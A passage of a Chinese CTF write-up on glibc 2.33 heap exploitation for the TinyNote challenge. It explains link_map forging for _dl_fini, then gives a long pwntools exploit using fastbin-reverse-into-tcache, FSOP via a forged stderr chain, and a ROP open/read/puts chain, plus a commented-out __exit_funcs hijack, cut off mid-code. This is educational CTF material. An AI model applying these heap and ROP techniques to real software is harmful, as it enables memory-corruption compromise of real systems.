<span class="comment">// l_info[0x1C]-&gt;d_un.d_val = sizeof(fini_array)</span></span><br><span class="line"><span class="number">0x31C</span> l_init_called  (should be no zero)</span><br></pre></td></tr></table></figure><blockquote><p>关于为什么linked list的长度要是4，其实原文章中提到的是需要<code>&gt;=4</code>，但是在调试所给的PoC时，同时结合源码分析，发现只能<code>=4</code>：</p><p>这应该是和初始化<code>_rtld_global-&gt;_dl_ns-&gt;_ns_nloaded</code>的值有关（这里是4），同时满足3个assert：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert (i &lt; nloaded);</span><br><span class="line">...</span><br><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>故在<code>ns = LM_ID_BASE</code>的情况下（默认如此），满足的约束为<code>i == nloaded</code>。</p></blockquote><p>不过还需具体情况下，进行调试分析得出。</p><p>同样小小总结一下，我们主要需要伪造一个<code>link_map</code>结构体，即<code>_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded</code>指向的结构体：</p><ul><li><code>l_addr</code>为基址</li><li><code>l_next</code>维护的单向链表长度为4</li><li><code>l_real</code>为结构体本身，即对于链表中每个<code>link_map</code>节点，其值必须等于本身</li><li><code>l_info[0x1A]</code>为<code>struct Elf64_Dyn *</code>，其指向的结构体需要满足<code>l_info[0x1A]-&gt;d_un.d_ptr + l_addr = fake_fini_array</code></li><li><code>l_info[0x1C]</code>同为<code>struct Elf64_Dyn *</code>，其指向的结构体需要满足<code>l_info[0x1C]-&gt;d_un.d_val = sizeof(fake_fini_array)</code></li><li><code>l_init_called</code>需不为0</li><li><code>fake_fini_array</code>中布置好需要调用的函数指针</li></ul><p>那么在程序<code>exit</code>进入<code>_dl_fini</code>后，就能调用目标函数。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>西湖论剑2021的TInyNote，这题需要通过fastbin_reverse_into_tcache，来实现“任意”地址写<code>tcache_pthread_struct</code>的地址。<br>但是，像上面提到的，由于tcache chunk现在需要对齐到0x10，且<code>fd</code>指针是受safe-linking机制保护的指针（值本身是非法地址），所以只能够实现向0x???????????8的位置，写入<code>tcache_pthread_struct</code>的地址。<br>那么综合考虑以上的利用方案，我们可以修改<code>stderr-&gt;_chain</code>，也可以修改<code>__exit_funcs</code>；至于<code>_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded</code>和<code>__call_tls_dtors</code>，都无法修改成合法的地址（因为它们地址都是0x??????????10）。<br>所以下面的exp主要通过两种方案来实现orw，一种是改<code>stderr-&gt;_chain</code>，通过<code>exit</code>触发<code>_IO_flush_all_lockp</code>完成利用；一种是伪造<code>__exit_funcs</code>，不过同样是在<code>exit</code>的时候完成利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">_proc = os.path.abspath(<span class="string">'./TinyNote'</span>)</span><br><span class="line">_libc = os.path.abspath(<span class="string">'./libc-2.33.so'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(_libc)</span><br><span class="line">elf = ELF(_proc)</span><br><span class="line"></span><br><span class="line">_debug = int(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">p = process(argv=[_proc])</span><br><span class="line"><span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># menu</span></span><br><span class="line">choose_items = &#123;</span><br><span class="line">    <span class="string">"add"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"edit"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"show"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"delete"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="string">"bonus"</span>: <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'add'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'edit'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'show'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'delete'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arbitrary_write</span><span class="params">(addr, content)</span>:</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"\x02"</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(addr ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################### Method 1: hijack stderr</span></span><br><span class="line"><span class="comment"># leak heap base</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x23</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64((heap_base + <span class="number">0x290</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x1e0ba0</span> - <span class="number">0x450</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc tcache_struct</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64((heap_base + <span class="number">0x10</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># chunk 0 points to tcache_struct</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare fastbin</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, p64((heap_base + <span class="number">0x310</span> + <span class="number">0x20</span> * i) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64((libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x68</span> - <span class="number">0x18</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x07"</span>) <span class="comment"># "fill" the tcache bin</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># put into fastbin</span></span><br><span class="line">edit(<span class="number">1</span>, p64((heap_base + <span class="number">0x2F0</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>))) <span class="comment"># prepare for fastbin reverse into tcache attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin reverse into tcache attack, this will change stderr-&gt;_chain</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span>) <span class="comment"># "clear" the tcache bin</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># forge stdout</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span>) <span class="comment"># "clear" the tcache bin</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFFF</span>)) <span class="comment"># _IO_write_base = 0, _IO_write_ptr = 0xFFFF (make sure _IO_write_ptr - _IO_write_base &gt; _IO_buf_end - _IO_buf_base)</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0x40</span>, p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xE00</span>)) <span class="comment"># _IO_buf_base = src buffer start</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0x50</span>, p64(heap_base + <span class="number">0xE00</span> + <span class="number">0xB0</span>)) <span class="comment"># _IO_buf_end = source buffer end</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0xe0</span>, p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x1e2560</span>)) <span class="comment"># vtable = _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ORW</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orw_payload</span><span class="params">(libc_base, orwchain_base)</span>:</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x0000000000028a55</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    pop_rsi = libc_base + <span class="number">0x000000000002a4cf</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">    pop_rdx = libc_base + <span class="number">0x00000000000c7f32</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    func_cnt = <span class="number">3</span></span><br><span class="line">    args_cnt = <span class="number">2</span> + <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += flat([pop_rdi, orwchain_base + func_cnt * <span class="number">8</span> + args_cnt * <span class="number">0x10</span>, pop_rsi, <span class="number">0</span>, libc_base + libc.sym[<span class="string">'open'</span>]])</span><br><span class="line">    payload += flat([pop_rdi, <span class="number">3</span>, pop_rsi, orwchain_base + <span class="number">0x100</span>, pop_rdx, <span class="number">0x40</span>, libc_base + libc.sym[<span class="string">'read'</span>]])</span><br><span class="line">    payload += flat([pop_rdi, orwchain_base + <span class="number">0x100</span>, libc_base + libc.sym[<span class="string">'puts'</span>]])</span><br><span class="line">    payload += <span class="string">"./flag"</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">rdi2rdx = libc_base + <span class="number">0x000000000014a0a0</span> <span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">rdx2rsp = libc_base + <span class="number">0x0000000000059020</span> <span class="comment"># mov rsp, rdx ; ret</span></span><br><span class="line">add_rsp_0x28 = libc_base + <span class="number">0x0000000000044ce5</span> <span class="comment"># add rsp, 0x28 ; ret</span></span><br><span class="line"></span><br><span class="line">ropchain_addr = heap_base + <span class="number">0xE00</span></span><br><span class="line">ropchain = flat([add_rsp_0x28, ropchain_addr, rdi2rdx, <span class="number">0</span>, rdx2rsp])</span><br><span class="line">ropchain += p64(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">ropchain += orw_payload(libc_base, ropchain_addr + <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range((len(ropchain) + <span class="number">8</span>) // <span class="number">0x10</span>):</span><br><span class="line">    arbitrary_write(ropchain_addr + i*<span class="number">0x10</span>, ropchain[i*<span class="number">0x10</span>:(i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare buffer for FSOP</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0x160</span>, p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'__free_hook'</span>] - <span class="number">0x10</span>)) <span class="comment"># tcache bin (0x1D0) = &amp;__free_hook - 8</span></span><br><span class="line">arbitrary_write(heap_base + <span class="number">0x40</span>, p64(<span class="number">0x1000000000000</span>) + p64(heap_base + <span class="number">0xE00</span>)) <span class="comment"># tcache count (0x1D0) = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear fastbin</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x07"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base &gt;&gt; <span class="number">12</span>))</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger exit</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x02"</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64((heap_base + <span class="number">0x2000</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"><span class="comment">####################################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># #################################### Method 2: hijack __exit_funcs</span></span><br><span class="line"><span class="comment"># # leak heap base</span></span><br><span class="line"><span class="comment"># add(0)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># add(0)</span></span><br><span class="line"><span class="comment"># show(0)</span></span><br><span class="line"><span class="comment"># p.recvuntil("Content:")</span></span><br><span class="line"><span class="comment"># heap_base = u64(p.recv(8)) &lt;&lt; 12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # leak libc base</span></span><br><span class="line"><span class="comment"># for i in range(0x23):</span></span><br><span class="line"><span class="comment">#     add(1)</span></span><br><span class="line"><span class="comment"># add(2)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># edit(2, p64((heap_base + 0x290) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># edit(1, p64(0) + p64(0x421))</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># add(0)</span></span><br><span class="line"><span class="comment"># show(0)</span></span><br><span class="line"><span class="comment"># p.recvuntil("Content:")</span></span><br><span class="line"><span class="comment"># libc_base = u64(p.recv(8)) - 0x1e0ba0 - 0x450</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # malloc tcache_struct</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># edit(1, p64((heap_base + 0x10) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line"><span class="comment"># add(0)</span></span><br><span class="line"><span class="comment"># add(0) # chunk 0 points to tcache_struct</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # prepare fastbin</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># for i in range(5):</span></span><br><span class="line"><span class="comment">#     add(2)</span></span><br><span class="line"><span class="comment">#     edit(2, p64((heap_base + 0x310 + 0x20 * i) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line"><span class="comment"># add(2)</span></span><br><span class="line"><span class="comment"># edit(2, p64((libc_base + 0x1ed630 - 0x10) ^ (heap_base &gt;&gt; 12))) # __exit_funcs</span></span><br><span class="line"><span class="comment"># edit(0, "\x07") # "fill" the tcache bin</span></span><br><span class="line"><span class="comment"># delete(1) # put into fastbin</span></span><br><span class="line"><span class="comment"># edit(1, p64((heap_base + 0x2F0) ^ (heap_base &gt;&gt; 12))) # prepare for fastbin reverse into tcache attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin reverse into tcache attack, this will change fs:[0x30] to (heapbase + 0x3a0) ^ ((libc_base + 0x1ed630) &gt;&gt; 12)</span></span><br><span class="line"><span class="comment"># edit(0, "\x00") # "clear" the tcache bin</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># __pointer_chk = (heap_base + 0x3a0) ^ ((libc_base + 0x1ed630) &gt;&gt; 12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # clear fastbin</span></span><br><span class="line"><span class="comment"># edit(0, "\x07")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># edit(1, p64(heap_base &gt;&gt; 12))</span></span><br><span class="line"><span class="comment"># edit(0, "\x00")</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # ORW</span></span><br><span class="line"><span class="comment"># def orw_payload(libc_base, orwchain_base):</span></span><br><span class="line"><span class="comment">#     pop_rdi = libc_base + 0x0000000000028a55 # pop rdi ; ret</span></span><br><span class="line"><span class="comment">#     pop_rsi = libc_base + 0x000000000002a4cf # pop rsi ; ret</span></span><br><span class="line"><span class="comment">#     pop_rdx = libc_base + 0x00000000000c7f32 # pop rdx ; ret</span></span><br><span class="line"><span class="comment">#     func_cnt = 3</span></span><br><span class="line"><span class="comment">#     args_cnt = 2 + 3 + 1</span></span><br><span class="line"><span class="comment">#     payload = ""</span></span><br><span class="line"><span class="comment">#     payload += flat([pop_rdi, orwchain_base + func_cnt * 8 + args_cnt * 0x10, pop_rsi, 0, libc_base + libc.sym['open']])</span></span><br><span class="line"><span class="comment">#     payload += flat([pop_rdi, 3, pop_rsi, orwchain_base + 0x100, pop_rdx, 0x40, libc_base + libc.sym['read']])</span></span><br><span class="line"><span class="comment">#     payload += flat([pop_rdi, orwchain_base + 0x100, libc_base + libc.sym['puts']])</span></span><br><span class="line"><span class="comment">#     payload += "./flag"</span></span><br><span class="line"><span class="comment">#     return payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi2rdx = libc_base + 0x000000000014a0a0 # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"><span class="comment"># rdx2rsp = libc_base + 0x0000000000059020 # mov rsp, rdx ; ret</span></span><br><span class="line"><span class="comment"># add_rsp_0x28 = libc_base + 0x0000000000044ce5 # add rsp, 0x28 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ropchain_addr = heap_base + 0xA00</span></span><br><span class="line"><span class="comment"># ropchain = flat([add_rsp_0x28, ropchain_addr, 0, 0, rdx2rsp])</span></span><br><span class="line"><span class="comment"># ropchain += p64(0) # padding</span></span><br><span class="line"><span class="comment"># ropchain += orw_payload(libc_base, ropchain_addr + 0x30)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range((len(ropchain) + 8) // 0x10):</span></span><br><span class="line"><span class="comment">#     arbitrary_write(ropchain_addr + i*0x10, ropchain[i*0x10:(i+1)*0x10])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # forge __exit_function</span></span><br><span class="line"><span class="comment"># edit(0, "\x00") # "clear" the tcache bin</span></span><br><span class="line"><span class="comment"># arbitrary_write(heap_base + 0x10, p64(0) + p64(1)) # exit_function_list-&gt;next = NULL, exit_function_list-&gt;idx = 1</span></span><br><span class="line"><span class="comment"># encoded_rdi2rdx = rdi2rdx ^ __pointer_chk</span></span><br><span class="line"><span class="comment"># encoded_rdi2rdx = ((encoded_rdi2rdx &lt;&lt; 17) &amp; ((1 &lt;&lt; 64) - 1)) | (encoded_rdi2rdx &gt;&gt; (64 - 17))</span></span><br><span 